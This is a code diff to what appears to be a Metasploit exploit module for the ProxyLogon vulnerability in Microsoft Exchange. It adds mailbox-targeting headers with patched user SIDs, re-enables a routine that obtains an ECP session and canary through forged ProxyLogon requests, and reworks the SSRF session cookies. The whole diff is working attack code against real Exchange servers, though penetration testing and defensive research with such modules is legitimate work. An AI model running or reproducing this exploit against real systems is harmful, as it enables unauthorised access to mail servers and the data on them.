@@ -175,7 +175,8 @@ class MetasploitModule < Msf::Exploit::Remote
       cookie: exploit_info[2],
       ctype: 'application/json; charset=utf-8',
       headers: {
-        'msExchLogonMailbox' => patch_sid(exploit_info[1])
+        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
+        'msExchTargetMailbox' => patch_sid(exploit_info[1])
       }
     )
     return '' if response.code != 200
@@ -338,6 +339,7 @@ class MetasploitModule < Msf::Exploit::Remote
       ctype: 'application/json; charset=utf-8',
       headers: {
         'msExchLogonMailbox' => patch_sid(sid),
+        'msExchTargetMailbox' => patch_sid(sid)
       }
     )
 
@@ -365,7 +367,8 @@ class MetasploitModule < Msf::Exploit::Remote
       data: data,
       ctype: 'text/xml; charset=utf-8',
       headers: {
-        'msExchLogonMailbox' => patch_sid(sid)
+        'msExchLogonMailbox' => patch_sid(sid),
+        'msExchTargetMailbox' => patch_sid(sid)
       }
     )
     if response.code == 241
@@ -396,13 +399,8 @@ class MetasploitModule < Msf::Exploit::Remote
 
     session = "ClientId=#{client_id};"
 
-    print_status('Try to get a good msExchCanary (by patching user SID)')
-    session_id, canary = request_proxylogon(server_name, patch_sid(sid), session)
-
-    session = "#{session} ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
-
     # search oab
-    oab_id = request_oab(server_name, sid, session, canary)
+    sid, session, canary, oab_id = search_oab(server_name, sid, session)
 
     [server_name, sid, session, canary, oab_id]
   end
@@ -441,24 +439,23 @@ class MetasploitModule < Msf::Exploit::Remote
     [input_name, remote_file]
   end
 
-=begin
-  def search_oab(server_name, sid)
+  def search_oab(server_name, sid, session)
     # request cookies (session and canary)
     print_status(message('Sending ProxyLogon request'))
 
     print_status('Try to get a good msExchCanary (by patching user SID method)')
-    session_id, canary = request_proxylogon(server_name, patch_sid(sid))
+    session_id, canary = request_proxylogon(server_name, patch_sid(sid), session)
     if canary
-      session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
-      oab_id = request_oab(server_name, sid, session, canary)
+      auth_session = "#{session} ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
+      oab_id = request_oab(server_name, sid, auth_session, canary)
     end
 
     if oab_id.nil? || oab_id.empty?
       print_status('Try to get a good msExchCanary (without correcting the user SID)')
-      session_id, canary = request_proxylogon(server_name, sid)
+      session_id, canary = request_proxylogon(server_name, sid, session)
       if canary
-        session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
-        oab_id = request_oab(server_name, sid, session, canary)
+        auth_session = "#{session} ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
+        oab_id = request_oab(server_name, sid, auth_session, canary)
       end
     end
 
@@ -470,9 +467,8 @@ class MetasploitModule < Msf::Exploit::Remote
     print_status("msExchEcpCanary: #{canary}")
     print_status("OAB id: #{oab_id[1]} (#{oab_id[0]})")
 
-    return [sid, session, canary, oab_id]
+    return [sid, auth_session, canary, oab_id]
   end
-=end
 
   def send_http(method, ssrf, opts = {})
     ssrf = "X-BEResource=#{ssrf};"
@@ -554,7 +550,8 @@ class MetasploitModule < Msf::Exploit::Remote
       cookie: exploit_info[2],
       ctype: 'application/json; charset=utf-8',
       headers: {
-        'msExchLogonMailbox' => patch_sid(exploit_info[1])
+        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
+        'msExchTargetMailbox' => patch_sid(exploit_info[1])
       }
     )
     return '' if response.code != 200
